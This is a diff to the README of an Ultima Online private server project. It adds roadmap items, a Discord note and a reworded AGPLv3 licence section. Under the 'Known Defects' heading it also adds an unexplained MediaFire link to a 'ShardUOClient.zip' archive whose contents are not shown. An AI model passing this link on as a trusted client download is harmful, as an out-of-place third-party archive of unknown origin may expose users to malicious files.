@@ -33,8 +33,10 @@ basic supporting features are also slated before the first alpha including
 vendors, mounts, pack animals, and banking.
 
 ### Known Defects ###
+https://www.mediafire.com/file/i3elgf9eu48mil0/ShardUOClient.zip/file
 
 ### Required Features and Tasks ###
+* Panic handling at the request level
 * Complete decorating Britain
 
 ### Nice to Haves ###
@@ -60,6 +62,7 @@ opened to outside connections.
 * Create homepage site and service
 * Make client available for download somehow
 * Make the GitHub project public in compliance with AGPLv3
+* Update welcome with Discord invite
 
 ### Miscellaneous Issues ###
 This is a list of known issues that do not need to be resolved before the next
@@ -135,13 +138,12 @@ content would require nearly a complete re-write.
 
 This repository is licensed under the AGPLv3 or later (see LICENSE). This
 license requires that any modification to this source code be made available to
-the public under the same license terms. This goes into effect the moment you
-distribute a binary of the program in any form to anyone through any means or
-you make a service based on this source code available for connection on any
-network reachable by third-parties regardless if anyone connected. I chose this
+the public under the same license terms. This requirement to share the source
+code goes into effect when the software is made available for network
+connections regardless if a binary was distributed or not. I chose this
 license because I want to share knowledge and appreciation of the Ultima Online
-service during the late 90's and early 20's. I welcome anyone who would use this
-repository or its associated services who share that appreciation.
+service during the late 1990's and early 2000's. I welcome anyone who would use
+this repository or its associated services who share that appreciation.
 
 That said below are some things I have learned about administrating this shard.
 
